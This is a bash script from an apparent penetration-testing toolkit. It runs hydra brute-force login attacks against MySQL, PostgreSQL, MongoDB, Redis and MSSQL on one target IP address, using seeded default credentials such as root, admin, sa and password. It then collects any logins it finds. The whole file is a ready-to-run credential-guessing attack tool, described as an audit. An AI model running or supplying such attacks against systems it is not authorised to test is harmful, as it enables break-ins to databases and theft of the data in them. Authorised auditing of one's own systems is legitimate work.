#!/bin/bash

# ═══════════════════════════════════════════════════════════════════
# COMBINATION: DATABASE CLUSTER
# Tests all database systems for misconfigurations
# ═══════════════════════════════════════════════════════════════════

TARGET="192.168.1.100"  # <-- CHANGE THIS TO YOUR TARGET

# ═══════════════════════════════════════════════════════════════════

set -euo pipefail  # Enterprise error handling

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source utilities
source "$PROJECT_ROOT/scripts/logger.sh" 2>/dev/null || true
source "$PROJECT_ROOT/scripts/vpn_check.sh" 2>/dev/null && require_vpn "false"

# Configuration
OUTPUT_DIR="$PROJECT_ROOT/results/combinations"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$OUTPUT_DIR/combo_db_cluster_${TARGET//[.:\/]/_}_$(date +%Y%m%d_%H%M%S).log"

echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  COMBINATION ATTACK: DATABASE CLUSTER" | tee -a "$LOG_FILE"
echo "  Target: $TARGET" | tee -a "$LOG_FILE"
echo "  Testing: MySQL + PostgreSQL + MongoDB + Redis + MSSQL" | tee -a "$LOG_FILE"
echo "  Scenario: Multi-Database Environment Audit" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

USERLIST="$PROJECT_ROOT/config/admin_usernames.txt"
PASSLIST="$PROJECT_ROOT/config/admin_passwords.txt"

[ ! -f "$USERLIST" ] && echo -e "root\nadmin\ndb_admin" > "$USERLIST"
[ ! -f "$PASSLIST" ] && echo -e "password\nroot\nadmin123" > "$PASSLIST"

# Phase 1: MySQL
echo "━━━ Phase 1: MySQL (Port 3306) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -L "$USERLIST" -P "$PASSLIST" -t 4 -f mysql://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 2: PostgreSQL
echo "━━━ Phase 2: PostgreSQL (Port 5432) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    echo -e "postgres\npostgresql\nadmin" > /tmp/pg_users.txt
    hydra -L /tmp/pg_users.txt -P "$PASSLIST" -t 4 -f postgres://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    rm -f /tmp/pg_users.txt
fi
echo "" | tee -a "$LOG_FILE"

# Phase 3: MongoDB
echo "━━━ Phase 3: MongoDB (Port 27017) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    echo -e "admin\nmongo\nroot" > /tmp/mongo_users.txt
    hydra -L /tmp/mongo_users.txt -P "$PASSLIST" -t 4 -f mongodb://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    rm -f /tmp/mongo_users.txt
fi
echo "" | tee -a "$LOG_FILE"

# Phase 4: Redis
echo "━━━ Phase 4: Redis (Port 6379) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    hydra -P "$PASSLIST" -t 4 -f redis://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
fi
echo "" | tee -a "$LOG_FILE"

# Phase 5: MSSQL
echo "━━━ Phase 5: MSSQL (Port 1433) ━━━" | tee -a "$LOG_FILE"
if command -v hydra &>/dev/null; then
    echo -e "sa\nadmin" > /tmp/mssql_users.txt
    hydra -L /tmp/mssql_users.txt -P "$PASSLIST" -t 4 -f mssql://"$TARGET" 2>&1 | tee -a "$LOG_FILE" || true
    rm -f /tmp/mssql_users.txt
fi
echo "" | tee -a "$LOG_FILE"

# Summary
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"
echo "  DATABASE CLUSTER ATTACK COMPLETE" | tee -a "$LOG_FILE"
echo "════════════════════════════════════════════════════════" | tee -a "$LOG_FILE"

if grep -q "login:" "$LOG_FILE"; then
    echo "" | tee -a "$LOG_FILE"
    echo "[+] DATABASE CREDENTIALS FOUND:" | tee -a "$LOG_FILE"
    grep "login:" "$LOG_FILE" | tee -a "$LOG_FILE"
fi

exit 0
